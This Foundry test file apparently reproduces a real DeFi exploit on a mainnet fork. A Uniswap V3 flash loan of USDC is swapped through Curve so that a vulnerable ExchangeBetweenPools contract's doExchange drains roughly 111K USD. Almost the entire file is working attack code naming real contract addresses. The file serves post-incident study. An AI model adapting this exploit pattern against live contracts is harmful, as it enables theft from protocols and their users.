// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";

import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
import {IcurveYSwap} from "src/interfaces/IcurveYSwap.sol";

import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
// @KeyInfo - Total Lost : ~111K USD$
// Attacker : https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671
// Attack Contract : https://etherscan.io/address/0x7c28e0977f72c5d08d5e1ac7d52a34db378282b3
// Vulnerable Contract : https://etherscan.io/address/0x765b8d7cd8ff304f796f4b6fb1bcf78698333f6d
// Attack Tx : https://etherscan.io/tx/0x578a195e05f04b19fd8af6358dc6407aa1add87c3167f053beb990d6b4735f26

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x765b8d7cd8ff304f796f4b6fb1bcf78698333f6d#code

// @Analysis
// Post-mortem : https://www.google.com/
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1663810037788311561
// Hacking God : https://www.google.com/

interface IExchangeBetweenPools {

    function doExchange(uint256 amounts) external returns (bool);

}

contract ContractTest is Test {

    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IExchangeBetweenPools ExchangeBetweenPools = IExchangeBetweenPools(0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D);
    IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IUniswapV3Pair Pair = IUniswapV3Pair(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    uint256 victimAmount = 119_023_523_157;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_376_906);
        vm.label(address(USDC), "USDC");
        vm.label(address(USDT), "USDT");
        vm.label(address(ExchangeBetweenPools), "ExchangeBetweenPools");
        vm.label(address(curveYSwap), "curveYSwap");
    }

    function testExploit() external {
        USDC.approve(address(curveYSwap), type(uint256).max);
        (bool success2,) = address(USDT).call(
            abi.encodeWithSignature("approve(address,uint256)", address(curveYSwap), type(uint256).max)
        );
        Pair.flash(address(this), 0, 120_000 * 1e6, new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        curveYSwap.exchange_underlying(1, 2, 120_000 * 1e6, 0);
        ExchangeBetweenPools.doExchange(victimAmount);
        curveYSwap.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
        USDC.transfer(address(Pair), 120_000 * 1e6 + uint256(amount1));
    }

}
